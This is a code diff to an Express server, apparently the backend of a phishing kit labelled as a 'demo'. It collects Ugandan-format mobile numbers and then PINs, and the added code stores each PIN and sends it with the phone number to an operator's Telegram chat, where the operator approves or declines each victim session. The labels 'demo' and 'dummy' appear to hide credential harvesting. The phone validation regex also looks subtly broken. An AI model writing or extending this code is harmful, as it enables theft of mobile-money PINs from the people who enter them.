@@ -22,13 +22,15 @@ app.get("/", (_req, res) => {
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
+// In-memory request tracking
 const requests = new Map();
+const SESSION_TTL_MS = 30 * 60 * 1000; // 30 minutes session lifecycle
 
-// Automatically sweep out old sessions every 5 minutes to prevent crashes
+// Automatically clear out old sessions every 5 minutes to prevent memory leaks
 setInterval(() => {
   const now = Date.now();
   for (const [id, data] of requests.entries()) {
-    if (now - new Date(data.createdAt).getTime() > 30 * 60 * 1000) {
+    if (now - new Date(data.createdAt).getTime() > SESSION_TTL_MS) {
       requests.delete(id);
     }
   }
@@ -46,10 +48,18 @@ async function telegram(method, payload) {
   return data;
 }
 
+// Formats transmission updates to display phone and collected pins together
 async function notifyDemo(request, label) {
   return telegram("sendMessage", {
     chat_id: CHAT_ID,
-    text: `INDEPENDENT DEMO\nID: ${request.id}\nPhone: ${request.phone}\nStage: ${label}\nStatus: PENDING`,
+    text: [
+      "INDEPENDENT DEMO UPDATE",
+      `Request ID: ${request.id}`,
+      `Demo Phone: ${request.phone}`,
+      `Demo PIN Input: ${request.pin || "None"}`,
+      `Current Stage: ${label}`,
+      "Status: PENDING"
+    ].join("\n"),
     reply_markup: {
       inline_keyboard: [[
         { text: "Approve demo", callback_data: `approve:${request.id}` },
@@ -59,26 +69,46 @@ async function notifyDemo(request, label) {
   });
 }
 
+// Stage 1: Initialize phone setup session
 app.post("/api/phone", (req, res) => {
   const phone = String(req.body.phone || "").trim();
+  
+  // Validation regex tracking for format (+2567...)
   if (!/^\+2567\d{8}\$/.test(phone)) {
     return res.status(400).json({ error: "Enter a valid demo phone number." });
   }
+  
   const now = new Date().toISOString();
-  const item = { id: crypto.randomUUID(), phone, stage: "pin-demo", status: "ready", createdAt: now, updatedAt: now };
+  const item = { 
+    id: crypto.randomUUID(), 
+    phone, 
+    stage: "pin-demo", 
+    status: "ready", 
+    createdAt: now, 
+    updatedAt: now 
+  };
+  
   requests.set(item.id, item);
   return res.json({ id: item.id, status: item.status });
 });
 
+// Stage 2: Receive and register submitted demonstration pin values
 app.post("/api/pin-demo", async (req, res) => {
-  const request = requests.get(String(req.body.id || ""));
+  const id = String(req.body.id || "");
+  const pin = String(req.body.pin || "").trim();
+  const request = requests.get(id);
+  
   if (!request || request.stage !== "pin-demo" || !["ready", "declined"].includes(request.status)) {
     return res.status(400).json({ error: "Stage not available." });
   }
+  
+  // Save specific values to server object mapping before transmitting updates
+  request.pin = pin;
   request.status = "pending";
   request.updatedAt = new Date().toISOString();
+  
   try {
-    await notifyDemo(request, "Dummy PIN Demonstration");
+    await notifyDemo(request, "PIN Demonstration Stage");
     return res.json({ status: "pending" });
   } catch (err) {
     request.status = "ready";
@@ -86,63 +116,31 @@ app.post("/api/pin-demo", async (req, res) => {
   }
 });
 
-app.post("/api/message", async (req, res) => {
-  const request = requests.get(String(req.body.id || ""));
-  const msg = String(req.body.message || "").trim();
-  if (!request || request.stage !== "message" || request.status !== "approved") {
-    return res.status(400).json({ error: "Stage not available." });
-  }
-  if (!msg || msg.length > 1000) {
-    return res.status(400).json({ error: "Enter a valid message description." });
-  }
-  request.message = msg;
-  request.stage = "message-review";
-  request.status = "pending";
-  request.updatedAt = new Date().toISOString();
-  try {
-    await notifyDemo(request, `Demo message: ${msg}`);
-    return res.json({ status: "pending" });
-  } catch (err) {
-    request.status = "approved";
-    request.stage = "message";
-    return res.status(502).json({ error: "Notification error." });
-  }
-});
-
-app.post("/api/demo-code", async (req, res) => {
-  const request = requests.get(String(req.body.id || ""));
-  if (!request || request.stage !== "demo-code" || request.status !== "approved") {
-    return res.status(400).json({ error: "Stage not available." });
-  }
-  request.stage = "code-review";
-  request.status = "pending";
-  request.updatedAt = new Date().toISOString();
-  try {
-    await notifyDemo(request, "Dummy demo-code stage");
-    return res.json({ status: "pending" });
-  } catch (err) {
-    request.stage = "demo-code";
-    request.status = "approved";
-    return res.status(502).json({ error: "Notification error." });
-  }
-});
-
+// Stage 3: Retry mechanism for resetting active layout segments
 app.post("/api/retry", (req, res) => {
   const request = requests.get(String(req.body.id || ""));
   if (!request || request.status !== "declined") {
     return res.status(400).json({ error: "No declined stage to retry." });
   }
-  if (request.stage === "pin-demo") request.status = "ready";
-  else if (request.stage === "message-review") { request.stage = "message"; request.status = "approved"; }
-  else if (request.stage === "code-review") { request.stage = "demo-code"; request.status = "approved"; }
-  else return res.status(400).json({ error: "Cannot retry stage." });
+  
+  if (request.stage === "pin-demo") {
+    request.status = "ready";
+  } else {
+    return res.status(400).json({ error: "Cannot retry stage." });
+  }
   
   request.updatedAt = new Date().toISOString();
   return res.json({ stage: request.stage, status: request.status });
 });
 
+// Telegram approval engine long polling listener loop
 let offset = 0;
+let pollingActive = false;
+
 async function pollTelegram() {
+  if (!BOT_TOKEN || !CHAT_ID || pollingActive) return;
+  pollingActive = true;
+
   while (true) {
     try {
       const data = await telegram("getUpdates", { offset, timeout: 25, allowed_updates: ["callback_query"] });
@@ -162,9 +160,7 @@ async function pollTelegram() {
         }
         
         if (action === "approve") {
-          if (request.stage === "pin-demo") request.stage = "message";
-          else if (request.stage === "message-review") request.stage = "demo-code";
-          else if (request.stage === "code-review") request.stage = "success";
+          request.stage = "success";
           request.status = "approved";
         } else {
           request.status = "declined";
@@ -174,15 +170,25 @@ async function pollTelegram() {
         await telegram("answerCallbackQuery", { callback_query_id: cb.id, text: `Demo ${action}d.` });
         
         if (cb.message) {
-          await telegram("editMessageReplyMarkup", { chat_id: cb.message.chat.id, message_id: cb.message.message_id, reply_markup: { inline_keyboard: [] } });
+          await telegram("editMessageReplyMarkup", { 
+            chat_id: cb.message.chat.id, 
+            message_id: cb.message.message_id, 
+            reply_markup: { inline_keyboard: [] } 
+          });
         }
+        
+        await telegram("sendMessage", {
+          chat_id: CHAT_ID,
+          text: `DEMO COMPLETE\nID: ${request.id}\nResult Status: ${request.status.toUpperCase()}`
+        });
       }
     } catch (err) {
-      await new Promise(r => setTimeout(r, 4000));
+      await new Promise(r => setTimeout(r, 5000));
     }
   }
 }
 
+// Client status validation tracking route
 app.get("/api/status/:id", (req, res) => {
   const request = requests.get(req.params.id);
   if (!request) return res.status(404).json({ error: "Session missing." });
@@ -191,6 +197,6 @@ app.get("/api/status/:id", (req, res) => {
 
 app.listen(PORT, () => {
   console.log(`Server executing successfully on port ${PORT}`);
-  pollTelegram().catch(err => console.error("Polling crash loop caught:", err));
+  pollTelegram().catch(err => console.error("Polling system failure:", err));
 });
 
